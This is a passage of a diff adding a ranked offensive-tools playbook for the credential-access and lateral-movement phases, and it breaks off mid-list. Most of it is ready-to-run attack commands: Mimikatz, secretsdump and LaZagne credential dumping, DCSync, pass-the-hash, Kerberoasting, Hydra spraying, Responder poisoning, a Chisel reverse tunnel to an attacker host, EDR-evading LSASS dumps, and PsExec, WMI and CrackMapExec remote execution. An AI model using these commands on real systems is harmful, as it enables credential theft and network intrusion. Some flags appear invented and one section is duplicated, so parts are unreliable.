+# 8. Output as HTML
+beRoot.exe -html /opt/sec/output/beroot_html_<TIMESTAMP>.html
+
+# 9. Log to file
+beRoot.exe -log /opt/sec/output/beroot_log_<TIMESTAMP>.txt
+
+# 10. Verbose output
+beRoot.exe -v -o /opt/sec/output/beroot_verbose_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. Mimikatz
+**Description:** Tool for extracting passwords, hashes, and Kerberos tickets.
+
+**Why Best:** De facto tool for credential access and privilege escalation.
+
+**Mods (Commands):**
+```bash
+# 1. Dump passwords
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > /opt/sec/output/mimikatz_pass_<TIMESTAMP>.txt
+
+# 2. Dump SAM hashes
+mimikatz.exe "privilege::debug" "lsadump::sam" exit > /opt/sec/output/mimikatz_sam_<TIMESTAMP>.txt
+
+# 3. Dump LSA secrets
+mimikatz.exe "privilege::debug" "lsadump::secrets" exit > /opt/sec/output/mimikatz_lsa_<TIMESTAMP>.txt
+
+# 4. List Kerberos tickets
+mimikatz.exe "kerberos::list" exit > /opt/sec/output/mimikatz_kerb_<TIMESTAMP>.txt
+
+# 5. List certificates
+mimikatz.exe "crypto::certificates" exit > /opt/sec/output/mimikatz_cert_<TIMESTAMP>.txt
+
+# 6. Dump Kerberos tickets
+mimikatz.exe "sekurlsa::tickets" exit > /opt/sec/output/mimikatz_tickets_<TIMESTAMP>.txt
+
+# 7. DCSync attack
+mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<DOMAIN>\\<USER>" exit > /opt/sec/output/mimikatz_dcsync_<TIMESTAMP>.txt
+
+# 8. Pass-the-hash
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd" exit > /opt/sec/output/mimikatz_pth_<TIMESTAMP>.txt
+
+# 9. Pass-the-key AES128
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes128:<KEY> /run:cmd" exit > /opt/sec/output/mimikatz_key128_<TIMESTAMP>.txt
+
+# 10. Pass-the-key AES256
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<KEY> /run:cmd" exit > /opt/sec/output/mimikatz_key256_<TIMESTAMP>.txt
+```
+
+---
+
+## PHASE 6: CREDENTIAL ACCESS (★★★★★)
+
+**Description:** Techniques for stealing credentials such as account names and passwords.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. Mimikatz
+**Description:** Premier tool for credential dumping, extracting passwords, hashes, and Kerberos tickets from Windows memory.
+
+**Why Best:** Industry standard for credential access with unmatched extraction capabilities.
+
+**Mods (Commands):**
+```bash
+# 1. Dump passwords
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > /opt/sec/output/mimikatz_pass_<TIMESTAMP>.txt
+
+# 2. Dump SAM hashes
+mimikatz.exe "privilege::debug" "lsadump::sam" exit > /opt/sec/output/mimikatz_sam_<TIMESTAMP>.txt
+
+# 3. Dump LSA secrets
+mimikatz.exe "privilege::debug" "lsadump::secrets" exit > /opt/sec/output/mimikatz_lsa_<TIMESTAMP>.txt
+
+# 4. List Kerberos tickets
+mimikatz.exe "kerberos::list" exit > /opt/sec/output/mimikatz_kerb_<TIMESTAMP>.txt
+
+# 5. List certificates
+mimikatz.exe "crypto::certificates" exit > /opt/sec/output/mimikatz_cert_<TIMESTAMP>.txt
+
+# 6. Dump Kerberos tickets
+mimikatz.exe "sekurlsa::tickets" exit > /opt/sec/output/mimikatz_tickets_<TIMESTAMP>.txt
+
+# 7. DCSync attack
+mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<DOMAIN>\\<USER>" exit > /opt/sec/output/mimikatz_dcsync_<TIMESTAMP>.txt
+
+# 8. Pass-the-hash
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd" exit > /opt/sec/output/mimikatz_pth_<TIMESTAMP>.txt
+
+# 9. Pass-the-key AES128
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes128:<KEY> /run:cmd" exit > /opt/sec/output/mimikatz_key128_<TIMESTAMP>.txt
+
+# 10. Pass-the-key AES256
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<KEY> /run:cmd" exit > /opt/sec/output/mimikatz_key256_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. SecretsDump (Impacket)
+**Description:** Python tool dumping secrets from remote machines without installing agents.
+
+**Why Best:** Highly effective for remotely dumping SAM, LSA secrets, and NTDS.dit.
+
+**Mods (Commands):**
+```bash
+# 1. Dump credentials with password
+secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> > /opt/sec/output/secretsdump_pass_<TIMESTAMP>.txt
+
+# 2. Dump with NTLM hash
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> > /opt/sec/output/secretsdump_hash_<TIMESTAMP>.txt
+
+# 3. Dump SAM only
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -sam > /opt/sec/output/secretsdump_sam_<TIMESTAMP>.txt
+
+# 4. Dump LSA secrets only
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -lsa > /opt/sec/output/secretsdump_lsa_<TIMESTAMP>.txt
+
+# 5. Dump NTDS.dit
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -ntds > /opt/sec/output/secretsdump_ntds_<TIMESTAMP>.txt
+
+# 6. Save output
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -output /opt/sec/output/secretsdump_output_<TIMESTAMP>.txt
+
+# 7. DCSync style attack
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -just-dc > /opt/sec/output/secretsdump_dcsync_<TIMESTAMP>.txt
+
+# 8. DCSync for specific user
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -just-dc-user <USER> > /opt/sec/output/secretsdump_user_<TIMESTAMP>.txt
+
+# 9. Show password last set times
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -pwd-last-set > /opt/sec/output/secretsdump_pwd_<TIMESTAMP>.txt
+
+# 10. Include password history
+secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -history > /opt/sec/output/secretsdump_history_<TIMESTAMP>.txt
+```
+
+---
+
+#### 3. LaZagne
+**Description:** Open-source tool retrieving passwords from local machine software.
+
+**Why Best:** Recovers passwords from huge array of applications (browsers, email clients, databases).
+
+**Mods (Commands):**
+```bash
+# 1. Recover browser passwords
+laZagne.exe browsers > /opt/sec/output/lazagne_browsers_<TIMESTAMP>.txt
+
+# 2. Recover mail client passwords
+laZagne.exe mail > /opt/sec/output/lazagne_mail_<TIMESTAMP>.txt
+
+# 3. Recover database passwords
+laZagne.exe databases > /opt/sec/output/lazagne_db_<TIMESTAMP>.txt
+
+# 4. Recover WiFi passwords
+laZagne.exe wifi > /opt/sec/output/lazagne_wifi_<TIMESTAMP>.txt
+
+# 5. Recover system passwords (Windows)
+laZagne.exe sys > /opt/sec/output/lazagne_sys_<TIMESTAMP>.txt
+
+# 6. Recover all passwords
+laZagne.exe all > /opt/sec/output/lazagne_all_<TIMESTAMP>.txt
+
+# 7. Save to file
+laZagne.exe all -oN /opt/sec/output/lazagne_output_<TIMESTAMP>.txt
+
+# 8. JSON output
+laZagne.exe all -json > /opt/sec/output/lazagne_json_<TIMESTAMP>.json
+
+# 9. XML output
+laZagne.exe all -xml > /opt/sec/output/lazagne_xml_<TIMESTAMP>.xml
+
+# 10. HTML output
+laZagne.exe all -html > /opt/sec/output/lazagne_html_<TIMESTAMP>.html
+```
+
+---
+
+#### 4. Rubeus
+**Description:** C# toolset for raw Kerberos interactions and abuses.
+
+**Why Best:** Modern tool of choice for Kerberos-specific attacks like Kerberoasting and AS-REP roasting.
+
+**Mods (Commands):**
+```bash
+# 1. Kerberoast attack
+Rubeus.exe kerberoast > /opt/sec/output/rubeus_kerberoast_<TIMESTAMP>.txt
+
+# 2. Kerberoast specific user
+Rubeus.exe kerberoast /user:<USER> > /opt/sec/output/rubeus_kerberoast_user_<TIMESTAMP>.txt
+
+# 3. AS-REP Roast attack
+Rubeus.exe asreproast > /opt/sec/output/rubeus_asreproast_<TIMESTAMP>.txt
+
+# 4. AS-REP Roast specific user
+Rubeus.exe asreproast /user:<USER> > /opt/sec/output/rubeus_asreproast_user_<TIMESTAMP>.txt
+
+# 5. Request TGT with password
+Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /password:<PASSWORD> > /opt/sec/output/rubeus_tgt_<TIMESTAMP>.txt
+
+# 6. Request TGT with hash
+Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<HASH> > /opt/sec/output/rubeus_tgt_hash_<TIMESTAMP>.txt
+
+# 7. Pass-the-ticket
+Rubeus.exe ptt /ticket:<TICKET_FILE>.kirbi > /opt/sec/output/rubeus_ptt_<TIMESTAMP>.txt
+
+# 8. Dump all current tickets
+Rubeus.exe dump > /opt/sec/output/rubeus_dump_<TIMESTAMP>.txt
+
+# 9. Renew ticket
+Rubeus.exe renew /ticket:<TICKET_FILE>.kirbi > /opt/sec/output/rubeus_renew_<TIMESTAMP>.txt
+
+# 10. S4U2self/Proxy abuse
+Rubeus.exe s4u /user:<USER> /ticket:<TICKET_FILE>.kirbi /domain:<DOMAIN> /altservice:<SERVICE> > /opt/sec/output/rubeus_s4u_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. Hydra
+**Description:** Password spraying and brute-force attacks.
+
+**Why Best:** Allows credential access using harvested user lists against services.
+
+**Mods (Commands):**
+```bash
+# 1. SSH password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> ssh -o /opt/sec/output/hydra_cred_ssh_<TIMESTAMP>.txt
+
+# 2. RDP password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> rdp -o /opt/sec/output/hydra_cred_rdp_<TIMESTAMP>.txt
+
+# 3. SMB password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> smb -o /opt/sec/output/hydra_cred_smb_<TIMESTAMP>.txt
+
+# 4. HTTP form password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -o /opt/sec/output/hydra_cred_http_<TIMESTAMP>.txt
+
+# 5. FTP password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> ftp -o /opt/sec/output/hydra_cred_ftp_<TIMESTAMP>.txt
+
+# 6. MySQL password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> mysql -o /opt/sec/output/hydra_cred_mysql_<TIMESTAMP>.txt
+
+# 7. POP3 password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> pop3 -o /opt/sec/output/hydra_cred_pop3_<TIMESTAMP>.txt
+
+# 8. Use credential list (user:pass)
+hydra -C /opt/sec/inputs/<CRED_LIST_FILE> <TARGET_IP> ssh -o /opt/sec/output/hydra_cred_list_<TIMESTAMP>.txt
+
+# 9. HTTPS form password spraying
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> https-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -o /opt/sec/output/hydra_cred_https_<TIMESTAMP>.txt
+
+# 10. Try null, same as user, and reverse
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt -e nsr <TARGET_IP> smb -o /opt/sec/output/hydra_cred_null_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. Responder
+**Description:** LLMNR, NBT-NS, and MDNS poisoner for credential capture.
+
+**Why Best:** Passive way to gather credentials, often yielding large number of hashes.
+
+**Mods (Commands):**
+```bash
+# 1. Start with interface
+responder -I <INTERFACE> -o /opt/sec/output/responder_cred_<TIMESTAMP>.txt
+
+# 2. Enable WPAD proxy poisoning
+responder -I <INTERFACE> -w -o /opt/sec/output/responder_cred_wpad_<TIMESTAMP>.txt
+
+# 3. Enable basic authentication
+responder -I <INTERFACE> -r -o /opt/sec/output/responder_cred_auth_<TIMESTAMP>.txt
+
+# 4. Enable DHCP responder
+responder -I <INTERFACE> -d -o /opt/sec/output/responder_cred_dhcp_<TIMESTAMP>.txt
+
+# 5. Force specific challenge
+responder -I <INTERFACE> -F -o /opt/sec/output/responder_cred_challenge_<TIMESTAMP>.txt
+
+# 6. Verbose output
+responder -I <INTERFACE> -v -o /opt/sec/output/responder_cred_verbose_<TIMESTAMP>.txt
+
+# 7. Analyze mode
+responder -I <INTERFACE> -A -o /opt/sec/output/responder_cred_analyze_<TIMESTAMP>.txt
+
+# 8. Fingerprint mode
+responder -I <INTERFACE> -f -o /opt/sec/output/responder_cred_fingerprint_<TIMESTAMP>.txt
+
+# 9. Specific protocol
+responder -I <INTERFACE> -P -o /opt/sec/output/responder_cred_protocol_<TIMESTAMP>.txt
+
+# 10. Use specific file
+responder -I <INTERFACE> -W -o /opt/sec/output/responder_cred_file_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. BloodHound
+**Description:** Tool for analyzing Active Directory attack paths.
+
+**Why Best:** Essential for identifying shortest path to high-value targets and complex privilege relationships.
+
+**Mods (Commands):**
+```bash
+# 1. Collect all data
+bloodhound --collection > /opt/sec/output/bloodhound_collect_<TIMESTAMP>.txt
+
+# 2. Save data to directory
+bloodhound --collection --output /opt/sec/output/bloodhound_data_<TIMESTAMP>/ > /opt/sec/output/bloodhound_output_<TIMESTAMP>.txt
+
+# 3. Import JSON file
+bloodhound --import /opt/sec/inputs/<FILE>.json > /opt/sec/output/bloodhound_import_<TIMESTAMP>.txt
+
+# 4. Export JSON file
+bloodhound --export /opt/sec/output/bloodhound_export_<TIMESTAMP>.json > /opt/sec/output/bloodhound_export_log_<TIMESTAMP>.txt
+
+# 5. Generate graph
+bloodhound --graph > /opt/sec/output/bloodhound_graph_<TIMESTAMP>.dot
+
+# 6. Run query
+bloodhound --query "<QUERY>" > /opt/sec/output/bloodhound_query_<TIMESTAMP>.txt
+
+# 7. Search for object
+bloodhound --search "<SEARCH_TERM>" > /opt/sec/output/bloodhound_search_<TIMESTAMP>.txt
+
+# 8. Show help
+bloodhound --help > /opt/sec/output/bloodhound_help_<TIMESTAMP>.txt
+
+# 9. Show version
+bloodhound --version > /opt/sec/output/bloodhound_version_<TIMESTAMP>.txt
+
+# 10. Open shell
+bloodhound --shell > /opt/sec/output/bloodhound_shell_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. Kerberoast (Impacket)
+**Description:** Request Kerberos TGS ticket for service account and crack offline.
+
+**Why Best:** Direct method to crack service account passwords, often leading to elevated access.
+
+**Mods (Commands):**
+```bash
+# 1. Request TGS for all SPNs
+GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -request > /opt/sec/output/kerberoast_all_<TIMESTAMP>.txt
+
+# 2. Request with hash
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -request > /opt/sec/output/kerberoast_hash_<TIMESTAMP>.txt
+
+# 3. Save output
+GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -request -output /opt/sec/output/kerberoast_output_<TIMESTAMP>.txt
+
+# 4. Save with hash
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -request -output /opt/sec/output/kerberoast_hash_output_<TIMESTAMP>.txt
+
+# 5. Specify DC IP
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -dc-ip <DC_IP> > /opt/sec/output/kerberoast_dc_<TIMESTAMP>.txt
+
+# 6. Save output
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -save > /opt/sec/output/kerberoast_save_<TIMESTAMP>.txt
+
+# 7. List SPNs only
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -list > /opt/sec/output/kerberoast_list_<TIMESTAMP>.txt
+
+# 8. Debug mode
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -debug > /opt/sec/output/kerberoast_debug_<TIMESTAMP>.txt
+
+# 9. No password
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -no-pass > /opt/sec/output/kerberoast_nopass_<TIMESTAMP>.txt
+
+# 10. Use Kerberos
+GetUserSPNs.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -k > /opt/sec/output/kerberoast_kerb_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. Chisel
+**Description:** Fast TCP/UDP tunnel over HTTP, secured over SSH.
+
+**Why Best:** Enables tools to reach otherwise inaccessible networks for credential access.
+
+**Mods (Commands):**
+```bash
+# 1. Start reverse server
+chisel server -p <PORT> --reverse > /opt/sec/output/chisel_server_<TIMESTAMP>.txt
+
+# 2. Start client for SOCKS proxy
+chisel client <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_socks_<TIMESTAMP>.txt
+
+# 3. Forward remote RDP port
+chisel client <ATTACKER_IP>:<PORT> R:8000:127.0.0.1:3389 > /opt/sec/output/chisel_rdp_<TIMESTAMP>.txt
+
+# 4. Server with key
+chisel server --port <PORT> --key <KEY> > /opt/sec/output/chisel_key_<TIMESTAMP>.txt
+
+# 5. Client with key
+chisel client --key <KEY> <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_key_client_<TIMESTAMP>.txt
+
+# 6. Server with auth
+chisel server -p <PORT> -auth <USER>:<PASSWORD> > /opt/sec/output/chisel_auth_<TIMESTAMP>.txt
+
+# 7. Client with auth
+chisel client -auth <USER>:<PASSWORD> <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_auth_client_<TIMESTAMP>.txt
+
+# 8. Log server activity
+chisel server -p <PORT> --log-file /opt/sec/output/chisel_log_<TIMESTAMP>.txt
+
+# 9. Log client activity
+chisel client --log-file /opt/sec/output/chisel_client_log_<TIMESTAMP>.txt <ATTACKER_IP>:<PORT> R:socks
+
+# 10. Set keepalive interval
+chisel client --keepalive 30s <ATTACKER_IP>:<PORT> R:socks > /opt/sec/output/chisel_keepalive_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. DumpertNG
+**Description:** LSASS memory dump tool using direct system calls and API unhooking.
+
+**Why Best:** Modern credential dumping that bypasses EDR/AV detection.
+
+**Mods (Commands):**
+```bash
+# 1. Create process snapshot and dump LSASS
+dumpertng.exe -o /opt/sec/output/dumpertng_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_log_<TIMESTAMP>.txt
+
+# 2. Dump with specific PID
+dumpertng.exe -pid <PID> -o /opt/sec/output/dumpertng_pid_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_pid_log_<TIMESTAMP>.txt
+
+# 3. Verbose output
+dumpertng.exe -v -o /opt/sec/output/dumpertng_verbose_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_verbose_log_<TIMESTAMP>.txt
+
+# 4. Quiet mode
+dumpertng.exe -q -o /opt/sec/output/dumpertng_quiet_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_quiet_log_<TIMESTAMP>.txt
+
+# 5. Compress output
+dumpertng.exe -c -o /opt/sec/output/dumpertng_compressed_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_compress_log_<TIMESTAMP>.txt
+
+# 6. Use specific compression level
+dumpertng.exe -c 5 -o /opt/sec/output/dumpertng_compress5_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_compress5_log_<TIMESTAMP>.txt
+
+# 7. Save to temp directory
+dumpertng.exe -temp -o /opt/sec/output/dumpertng_temp_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_temp_log_<TIMESTAMP>.txt
+
+# 8. Decompress dump
+dumpertng_decompress.exe /opt/sec/output/dumpertng_compressed_<TIMESTAMP>.dmp /opt/sec/output/dumpertng_decompressed_<TIMESTAMP>.dmp > /opt/sec/output/dumpertng_decompress_log_<TIMESTAMP>.txt
+
+# 9. Show help
+dumpertng.exe -h > /opt/sec/output/dumpertng_help_<TIMESTAMP>.txt
+
+# 10. Show version
+dumpertng.exe -version > /opt/sec/output/dumpertng_version_<TIMESTAMP>.txt
+```
+
+---
+
+## PHASE 7: LATERAL MOVEMENT (★★★★★)
+
+**Description:** Moving from one compromised system to another within the network.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. PsExec
+**Description:** Windows Sysinternals tool for remote process execution.
+
+**Why Best:** Simple, reliable, and part of Windows Sysinternals suite.
+
+**Mods (Commands):**
+```bash
+# 1. Interactive cmd on remote system
+PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASSWORD> cmd > /opt/sec/output/psexec_lateral_cmd_<TIMESTAMP>.txt
+
+# 2. Run as SYSTEM
+PsExec.exe \\\\<TARGET_IP> -s cmd > /opt/sec/output/psexec_lateral_system_<TIMESTAMP>.txt
+
+# 3. Copy and execute file
+PsExec.exe \\\\<TARGET_IP> -d -c /opt/sec/inputs/<LOCAL_FILE> <REMOTE_FILE> > /opt/sec/output/psexec_lateral_copy_<TIMESTAMP>.txt
+
+# 4. Run as logged-in user
+PsExec.exe \\\\<TARGET_IP> -e cmd > /opt/sec/output/psexec_lateral_user_<TIMESTAMP>.txt
+
+# 5. Run interactively
+PsExec.exe \\\\<TARGET_IP> -i cmd > /opt/sec/output/psexec_lateral_interactive_<TIMESTAMP>.txt
+
+# 6. Run with elevated privileges
+PsExec.exe \\\\<TARGET_IP> -h cmd > /opt/sec/output/psexec_lateral_elevated_<TIMESTAMP>.txt
+
+# 7. Set connection timeout
+PsExec.exe \\\\<TARGET_IP> -n <TIMEOUT> cmd > /opt/sec/output/psexec_lateral_timeout_<TIMESTAMP>.txt
+
+# 8. Specify service name
+PsExec.exe \\\\<TARGET_IP> -r <SERVICE_NAME> cmd > /opt/sec/output/psexec_lateral_service_<TIMESTAMP>.txt
+
+# 9. Set working directory
+PsExec.exe \\\\<TARGET_IP> -w <WORKING_DIR> cmd > /opt/sec/output/psexec_lateral_working_<TIMESTAMP>.txt
+
+# 10. Accept EULA
+PsExec.exe \\\\<TARGET_IP> -accepteula cmd > /opt/sec/output/psexec_lateral_eula_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. WMI (wmic / wmiexec.py)
+**Description:** Windows Management Instrumentation for remote execution.
+
+**Why Best:** Built-in Windows feature, stealthy "living off the land" technique.
+
+**Mods (Commands):**
+```bash
+# 1. Execute remote command
+wmic /node:<TARGET_IP> /user:<USER> /password:<PASSWORD> process call create "cmd /c whoami" > /opt/sec/output/wmi_cmd_<TIMESTAMP>.txt
+
+# 2. List processes
+wmic /node:<TARGET_IP> /user:<USER> /password:<PASSWORD> process list > /opt/sec/output/wmi_proc_<TIMESTAMP>.txt
+
+# 3. List services
+wmic /node:<TARGET_IP> /user:<USER> /password:<PASSWORD> service list > /opt/sec/output/wmi_services_<TIMESTAMP>.txt
+
+# 4. List startup programs
+wmic /node:<TARGET_IP> /user:<USER> /password:<PASSWORD> startup > /opt/sec/output/wmi_startup_<TIMESTAMP>.txt
+
+# 5. Get BIOS info
+wmic /node:<TARGET_IP> /user:<USER> /password:<PASSWORD> bios > /opt/sec/output/wmi_bios_<TIMESTAMP>.txt
+
+# 6. Impacket wmiexec
+wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami" > /opt/sec/output/wmi_exec_<TIMESTAMP>.txt
+
+# 7. Impacket with hash
+wmiexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> "whoami" > /opt/sec/output/wmi_hash_<TIMESTAMP>.txt
+
+# 8. Impacket with DC IP
+wmiexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -dc-ip <DC_IP> "whoami" > /opt/sec/output/wmi_dc_<TIMESTAMP>.txt
+
+# 9. Impacket debug mode
+wmiexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -debug "whoami" > /opt/sec/output/wmi_debug_<TIMESTAMP>.txt
+
+# 10. Impacket no password
+wmiexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -no-pass "whoami" > /opt/sec/output/wmi_nopass_<TIMESTAMP>.txt
+```
+
+---
+
+#### 3. WinRM (evil-winrm)
+**Description:** Windows Remote Management for lateral movement.
+
+**Why Best:** Built-in Windows protocol, often available and less monitored.
+
+**Mods (Commands):**
+```bash
+# 1. Connect with password
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> > /opt/sec/output/winrm_pass_<TIMESTAMP>.txt
+
+# 2. Connect with hash
+evil-winrm -i <TARGET_IP> -u <USER> -H <HASH> > /opt/sec/output/winrm_hash_<TIMESTAMP>.txt
+
+# 3. Upload files
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> -s /opt/sec/inputs/ > /opt/sec/output/winrm_upload_<TIMESTAMP>.txt
+
+# 4. Download files
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> -e /opt/sec/output/ > /opt/sec/output/winrm_download_<TIMESTAMP>.txt
+
+# 5. Run PowerShell script
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> --script /opt/sec/scripts/<SCRIPT>.ps1 > /opt/sec/output/winrm_script_<TIMESTAMP>.txt
+
+# 6. Start PowerShell shell
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> --shell > /opt/sec/output/winrm_shell_<TIMESTAMP>.txt
+
+# 7. Verbose mode
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> -v > /opt/sec/output/winrm_verbose_<TIMESTAMP>.txt
+
+# 8. Specify port
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> -P <PORT> > /opt/sec/output/winrm_port_<TIMESTAMP>.txt
+
+# 9. Show help
+evil-winrm --help > /opt/sec/output/winrm_help_<TIMESTAMP>.txt
+
+# 10. Log all output
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD> --log > /opt/sec/output/winrm_log_<TIMESTAMP>.txt
+```
+
+---
+
+#### 4. CrackMapExec
+**Description:** Post-exploitation tool for automating lateral movement.
+
+**Why Best:** Automates lateral movement commands against multiple targets efficiently.
+
+**Mods (Commands):**
+```bash
+# 1. Execute command via SMB
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --exec-method smbexec -x "whoami" > /opt/sec/output/cme_lateral_smb_<TIMESTAMP>.txt
+
+# 2. Execute via WMI
+crackmapexec smb <TARGET_IP> -u <USER> -H <HASH> --exec-method wmiexec -x "whoami" > /opt/sec/output/cme_lateral_wmi_<TIMESTAMP>.txt
+
+# 3. Enumerate shares
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares > /opt/sec/output/cme_lateral_shares_<TIMESTAMP>.txt
+
+# 4. Enumerate users
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --users > /opt/sec/output/cme_lateral_users_<TIMESTAMP>.txt
+
+# 5. Enumerate groups
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --groups > /opt/sec/output/cme_lateral_groups_<TIMESTAMP>.txt
+
+# 6. Dump SAM hashes
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --sam > /opt/sec/output/cme_lateral_sam_<TIMESTAMP>.txt
+
+# 7. Dump LSA secrets
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --lsa > /opt/sec/output/cme_lateral_lsa_<TIMESTAMP>.txt
+
+# 8. Execute via DCOM
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --dcom > /opt/sec/output/cme_lateral_dcom_<TIMESTAMP>.txt
+
+# 9. Execute via WMI with output
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --wmi > /opt/sec/output/cme_lateral_wmi2_<TIMESTAMP>.txt
+
+# 10. Dump NTDS.dit from DC
+crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --ntds > /opt/sec/output/cme_lateral_ntds_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. SC (Service Control)
+**Description:** Native Windows command-line tool for service management.
+
+**Why Best:** Create, start, and stop services on remote machines for stealthy lateral movement.
+
+**Mods (Commands):**
+```bash
+# 1. Create service
+sc \\\\<TARGET_IP> create <SERVICE_NAME> binPath= "cmd /c <COMMAND>" > /opt/sec/output/sc_create_<TIMESTAMP>.txt
+
+# 2. Start service
+sc \\\\<TARGET_IP> start <SERVICE_NAME> > /opt/sec/output/sc_start_<TIMESTAMP>.txt
+
+# 3. Delete service
+sc \\\\<TARGET_IP> delete <SERVICE_NAME> > /opt/sec/output/sc_delete_<TIMESTAMP>.txt
+
+# 4. Query service status
+sc \\\\<TARGET_IP> query <SERVICE_NAME> > /opt/sec/output/sc_query_<TIMESTAMP>.txt
+
+# 5. Stop service
+sc \\\\<TARGET_IP> stop <SERVICE_NAME> > /opt/sec/output/sc_stop_<TIMESTAMP>.txt
+
+# 6. Set service to auto-start
+sc \\\\<TARGET_IP> config <SERVICE_NAME> start= auto > /opt/sec/output/sc_config_<TIMESTAMP>.txt
+
+# 7. Query service configuration
+sc \\\\<TARGET_IP> qc <SERVICE_NAME> > /opt/sec/output/sc_qc_<TIMESTAMP>.txt
+
+# 8. Set failure actions
